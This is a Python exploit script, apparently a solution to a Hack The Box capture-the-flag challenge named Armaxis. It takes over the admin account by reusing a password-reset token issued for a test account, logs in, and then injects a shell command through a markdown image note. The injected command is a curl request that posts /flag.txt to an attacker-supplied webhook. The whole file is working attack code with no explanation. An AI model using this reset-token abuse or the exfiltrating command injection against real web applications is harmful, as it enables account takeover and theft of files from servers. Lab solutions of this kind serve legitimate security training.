import httpx
from bs4 import BeautifulSoup

class API:
    
    def __init__(self, url, webhook):
        self.url = url
        self.c = httpx.Client()
        self.adminEmail = "admin@armaxis.htb"
        self.webhook = webhook

    def register(self):
        info = {"email": "test@email.htb", "password": "admin"}
        resp = self.c.post(f"{self.url}/register", json=info).text
        return resp
    
    def resetPasswordRequest(self,):
        return self.c.post(f"{self.url}/reset-password/request", json={"email": "test@email.htb"}).text

    def resetPassword(self, token):
        return self.c.post(f"{self.url}/reset-password/", json={"token": token, "newPassword": "aa", "email": self.adminEmail}).text
    
    def login(self):
        resp = self.c.post(f"{self.url}/login", json={"email": self.adminEmail, "password": "aa"})
        self.c.headers["Cookie"] = resp.headers['Set-Cookie']
        print(f"[+] Logged in as admin; cookies: {self.c.headers['Cookie']}")
    
    def commandInjection(self):
        return self.c.post(f"{self.url}/weapons/dispatch", json={"name": "gedagedigedagedao", "price": 100.97, "note": f"![INJECTED](https://google.com ; curl -X POST -d @/flag.txt {self.webhook})", "dispatched_to": "mariaban"}).text

class MAIL:
    def deleteAllVerif(self):
        r = httpx.get("http://localhost:8080/deleteall")

    def getVerifCode(self):
        response = httpx.get("http://localhost:8080/")
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            td = soup.find('td', text=lambda t: t and 'Use this token to reset your password: ' in t)
            if td:
                verification_code = td.text.split('Use this token to reset your password: ')[1].strip()
                print(f"[+] Verification Code: {verification_code}")
                return verification_code
            else:
                print("Verification code not found.")
                return None
        else:
            print(f"Failed to fetch the page. Status code: {response.status_code}")
            return None

webhook = input("Enter your webhook: ")
api = API("http://localhost:1337", webhook)
mail = MAIL()

if __name__ == "__main__":
    mail.deleteAllVerif()
    print(api.register())
    print(api.resetPasswordRequest())
    verifcode = mail.getVerifCode()

    # reset admin password using the verification code
    print(api.resetPassword(verifcode))
    api.login()

    #inject command in markdown
    stat = api.commandInjection()
    if "successfully" in stat:
        print("[+] Command injection successful, check your webhook :D")

